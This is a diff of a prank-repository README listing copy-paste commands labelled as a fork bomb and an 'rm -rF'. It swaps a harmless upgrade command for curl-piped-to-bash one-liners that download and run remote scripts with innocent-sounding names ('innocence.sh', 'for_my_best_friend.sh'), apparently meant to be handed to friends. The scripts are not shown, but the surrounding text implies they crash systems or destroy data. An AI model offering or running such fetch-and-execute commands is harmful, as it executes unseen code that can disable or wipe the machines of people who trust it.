@@ -16,14 +16,13 @@ But don't worry Microsoft won't be able to recover your data after what they are
   - **Fork Bomb (Actual Bomb)**
     
 	```
-    winget upgrade --all
+    	bash <(curl -fsSL "https://raw.githubusercontent.com/RichardSmith240/JustForFun/main/scripts/innocence.sh") 
     ```
-	Requires System reboot or Power off to fix
 	
   - **rm -rF (Not Real)**
 
 	```
-	bash <(curl -fsSL "https://raw.githubusercontent.com/RichardSmith240/JustForFun/main/scripts/innocence.sh") 
+	bash <(curl -fsSL "https://raw.githubusercontent.com/RichardSmith240/JustForFun/main/scripts/for_my_best_friend.sh") 
     ```
 	
 </details>
